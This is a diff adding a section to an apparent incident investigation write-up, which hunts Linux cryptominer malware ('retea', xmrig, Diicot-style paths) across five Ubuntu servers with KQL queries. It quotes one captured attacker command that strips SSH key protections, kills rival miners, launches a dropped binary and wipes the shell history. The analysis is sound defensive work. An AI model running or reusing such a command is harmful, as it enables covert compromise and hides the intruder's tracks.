@@ -541,6 +541,43 @@ This investigation feels halfway done if my theory of lateral movement prior to 
 
 ### Investigation of Internal Network ###
 
+The first thing that I want to check is the presence of the same retea script in the network, this query initially returned 6 devices but as of March 23rd, 2025, it returns 5 devices. This is due to the 30 day data retention for advanced hunting, at a later point in this investigation we will have to utilize MDE data. about 80% of the devices share similiar process counts for the script.
+
+**Query Used**:
+```kql
+DeviceProcessEvents
+| where InitiatingProcessCommandLine contains "./retea -c"
+| summarize ProcessCount = count() by DeviceName, AccountName, bin(Timestamp, 1h)
+| project Timestamp, DeviceName, AccountName, ProcessCount
+| order by Timestamp asc
+```
+![image](https://github.com/user-attachments/assets/6c83f87b-1fb7-4664-8154-e21cf0dc0564)
+
+Now we need to see what these devices have in common. As we can see, all 5 devices are Linux Ubuntu Servers confirming my initial theory. This common factor can greatly assist us in tracking the malware in the future and back to its origin in our network. 
+
+**Query Used**:
+```kql
+let CompromisedDevices = dynamic(["linux-programmatic-vm-danny.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", "linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", "linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", "linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"]);
+DeviceInfo
+//| where PublicIP == "20.81.228.191"
+| where DeviceName in (CompromisedDevices)
+| distinct DeviceName, PublicIP, OSPlatform, OSDistribution, DeviceType
+```
+![image](https://github.com/user-attachments/assets/4a56da81-b276-4340-9b55-022fc30913b9)
+
+Investigation of the vm-danny was odd, the device was first seen on Mar 10, 2025 1:57:33 PM and last seen Mar 10, 2025 7:06:53 PM. Initial look into the process table appeared that the device was infected with the same malware before it was first seen as it displayed behavior mid malware execution and persistance. There was no insertion technique to be seen or even any VM configuration from azure on the logs. I'm led to believe that the device was either not logging before the time it was first seen or that attacker had completely botched clearing their tracks only to erase a significant portion of the devices logs.
+
+Investigation into linux program fix device yielded the same pattern of activity with the exception of a short attempt to brute force the device from an australian IP, 170.64.230.111, as account name backup and proxy until they gained access with root. It may be a coincidence that the logon event at 0551 AM happens to be when the /bin/sh /etc/update-motd.d/90-updates-available recon pattern appears. The log may have been cleaned to cover the point of entry, however it is safe to assume that this IP is associated with the activity based on what comes next. The next series of process events follows the pattern as expected with the exception of /usr/sbin/sshd -D -R to scp command pulling an executable from the tmp/cache leading to a bash command leading to the creation of the ./MNFleGNm and retea script
+
+```
+bash
+bash -c "crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; rm -rf /dev/shm/.x /dev/shm/rete* /var/tmp/payload /tmp/.diicot /tmp/kuak ; chattr -iae /var/tmp/Documents/.diicot ; chattr -iae /var/tmp/.update-logs/History ; chattr -iae /var/tmp/.update-logs/Update ; rm -rf /var/tmp/.update-logs /var/tmp/Documents ; mkdir /var/tmp/Documents > /dev/null 2>&1 ; cd /var/tmp/ ; pkill Opera ; rm -rf /var/tmp/Documents /var/tmp/.update-logs ; rm -rf xmrig  .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/ ; chmod 777 MNFleGNm ; ./MNFleGNm </dev/null &>/dev/null & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
+'''
+![image](https://github.com/user-attachments/assets/32a440fd-9970-4434-aa70-79694a86361c)
+![image](https://github.com/user-attachments/assets/c31054ab-c0e8-44e0-9821-a500751a37cd)
+![image](https://github.com/user-attachments/assets/eda92468-62ec-4575-b6e6-74476c5e593a)
+
+
 
 
 ### Summary of Findings
